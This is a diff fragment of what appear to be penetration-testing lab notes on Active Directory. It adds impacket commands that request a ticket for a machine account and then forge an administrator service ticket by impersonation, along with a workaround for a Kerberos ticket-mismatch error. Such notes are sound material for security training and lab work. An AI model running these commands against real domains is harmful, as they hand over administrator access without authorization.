@@ -1035,10 +1035,19 @@ nslookup appsrv01
       ```
 
 
+  * If faced `Kerberos SessionError: KRB_AP_ERR_BADMATCH(Ticket and authenticator don't match)` error, use the following commands:
+
+```bash
+# Solving KRB_AP_ERR_BADMATCH error
+impacket-getTGT 'cowmotors-int.com/myComputer$'
+export KRB5CCNAME=myComputer\$.ccache
+impacket-getST -spn cifs/web01.cowmotors-int.com -impersonate administrator -k -no-pass 'cowmotors-int.com/myComputer$'
+```
+
 * Use ccache file
   * ```
     mv administrator@cifs_jump09.ops.comply.com@OPS.COMPLY.COM.ccache new_admin.ccache
-    export KRB5CCNAME=/home/kali/Documents/offsec/challenges/5/new_admin.ccache
+    export KRB5CCNAME=new_admin.ccache
     ```
 * Execute Commands as Administrator
   * ```powershell
